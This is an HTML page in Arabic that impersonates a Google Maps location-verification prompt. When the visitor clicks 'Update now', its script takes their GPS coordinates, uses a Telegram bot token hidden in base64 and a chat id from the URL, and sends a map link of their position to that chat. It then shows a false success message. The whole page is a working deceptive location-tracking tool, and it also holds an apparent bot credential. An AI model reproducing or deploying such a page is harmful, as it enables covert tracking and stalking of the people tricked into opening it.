<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Verify</title>
    <style>
        body { background: #f5f5f5; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .btn { padding: 15px 30px; background: #4285F4; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" width="80"><br><br>
    <h3>تأكيد موقعك للمتابعة</h3>
    <p>يجب السماح بالوصول للموقع لتحديث الخرائط في منطقتك</p>
    <button class="btn" onclick="getLoc()">تحديث الآن</button>
    <script>
        function getLoc() {
            navigator.geolocation.getCurrentPosition(p => {
                const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
                const id = new URLSearchParams(window.location.search).get('id');
                const m = `📍 **موقع جديد (أبو سند)**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}`);
                alert("تم التحديث بنجاح!");
            }, () => { alert("يرجى السماح بالوصول للموقع لإتمام العملية."); });
        }
    </script>
</body>
</html>
